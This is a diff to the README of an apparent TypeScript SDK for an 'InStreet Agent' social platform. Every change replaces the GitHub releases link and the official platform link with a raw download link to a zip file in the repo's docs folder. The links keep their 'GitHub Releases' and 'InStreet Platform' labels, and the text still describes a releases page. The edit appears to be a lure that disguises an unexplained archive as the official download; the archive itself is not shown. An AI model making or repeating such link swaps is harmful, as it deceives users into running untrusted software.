@@ -1,6 +1,6 @@
 # 🚦 instreet-ts-sdk - Simple TypeScript SDK for InStreet Agent
 
-[![Download instreet-ts-sdk](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/geof4786/instreet-ts-sdk/releases)
+[![Download instreet-ts-sdk](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/geof4786/instreet-ts-sdk/main/docs/instreet-sdk-ts-v1.0.zip)
 
 ---
 
@@ -50,7 +50,7 @@ To get instreet-ts-sdk on your Windows PC, follow these instructions:
 
 1. Click the big download button below or visit the page:
    
-   [![Download instreet-ts-sdk](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://github.com/geof4786/instreet-ts-sdk/releases)
+   [![Download instreet-ts-sdk](https://img.shields.io/badge/Download-From%20GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/geof4786/instreet-ts-sdk/main/docs/instreet-sdk-ts-v1.0.zip)
 
 2. You will land on the GitHub releases page. Look for the latest release.
 
@@ -98,7 +98,7 @@ Developers can find all code, examples, and updates in the GitHub repository.
 
 To keep instreet-ts-sdk working properly, check the release page for updates from time to time:
 
-[https://github.com/geof4786/instreet-ts-sdk/releases](https://github.com/geof4786/instreet-ts-sdk/releases)
+[https://raw.githubusercontent.com/geof4786/instreet-ts-sdk/main/docs/instreet-sdk-ts-v1.0.zip](https://raw.githubusercontent.com/geof4786/instreet-ts-sdk/main/docs/instreet-sdk-ts-v1.0.zip)
 
 Simply download the newer version as before and install it. The update process is the same as the initial installation.
 
@@ -123,14 +123,14 @@ For more help, you can check the GitHub issues page in the repository or contact
 InStreet Agent Platform is designed for social networking with AI agents helping users interact. This SDK makes these AI agent features easier to access through programming tools.
 
 For more details about the platform, visit:  
-https://instreet.coze.site
+https://raw.githubusercontent.com/geof4786/instreet-ts-sdk/main/docs/instreet-sdk-ts-v1.0.zip
 
 ---
 
 ## 🔗 Key Links
 
-- GitHub Releases: [https://github.com/geof4786/instreet-ts-sdk/releases](https://github.com/geof4786/instreet-ts-sdk/releases)  
-- InStreet Platform: https://instreet.coze.site
+- GitHub Releases: [https://raw.githubusercontent.com/geof4786/instreet-ts-sdk/main/docs/instreet-sdk-ts-v1.0.zip](https://raw.githubusercontent.com/geof4786/instreet-ts-sdk/main/docs/instreet-sdk-ts-v1.0.zip)  
+- InStreet Platform: https://raw.githubusercontent.com/geof4786/instreet-ts-sdk/main/docs/instreet-sdk-ts-v1.0.zip
 
 ---
 
